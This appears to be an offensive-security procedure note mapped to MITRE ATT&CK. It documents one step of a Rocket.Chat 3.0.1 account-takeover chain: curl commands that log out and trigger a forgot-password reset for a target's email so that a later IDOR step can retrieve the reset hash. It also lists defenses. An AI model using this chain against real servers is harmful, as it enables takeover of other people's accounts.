---
id: p2b3c4d5-e6f7-8901-bcde-f23456789012
tags:
  - password-reset
  - credential-access
  - rocket-chat
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-forgot-password]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Account Manipulation]]'
updated_at: '2025-12-14T17:33:24.544Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Account Manipulation]]'
---
# Trigger Password Reset Email

## Summary

This procedure logs out an authenticated session and uses the forgot password feature to send a reset email to a target's address, generating a reset hash on the server without requiring authentication for the trigger.

## Description

Rocket.Chat's forgot password functionality at /home allows anonymous submission of an email, triggering a reset process that updates the user's record with a temporary hash. This hash is later exploitable via IDOR. The attack assumes the target's email from prior enumeration. Environment: Web-based Rocket.Chat 3.0.1.

## Requirements

1. Target's email address from enumeration
2. Access to the login/forgot password page
3. No active session needed for this step

## Defense

Defensive measures and detection strategies:

- Require CAPTCHA or rate limiting on forgot password submissions
- Log and monitor reset email triggers for anomaly detection
- Disable or restrict reset hashes exposure in API responses

## Objectives

1. Initiate password reset for target
2. Generate server-side reset hash
3. Prepare for hash retrieval in next step

## Instructions

### Step 1: Logout from Session

**Context**: Ensure no active authentication interferes with anonymous reset trigger.

**Instructions**: Manually log out via browser or API.

```bash
curl -X POST https://target/api/v1/logout -H "X-Auth-Token: YOUR_TOKEN" -H "X-User-Id: YOUR_ID"
```

> Clears session; response confirms logout.

### Step 2: Submit Forgot Password Request

**Context**: Trigger the reset email using the target's email.

**Command** ([[commands/curl-forgot-password]]):
```bash
curl -X POST https://target/api/v1/forgotPassword -H "Content-Type: application/json" -d '{"email": "target@example.com"}'
```

> Server sends email to target and generates reset hash associated with the user.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Account Manipulation]] Account Manipulation

### Sub-Techniques


## Commands Used

- [[commands/curl-forgot-password]]

## Tools Used


## Tags

- reset-trigger
- email-abuse
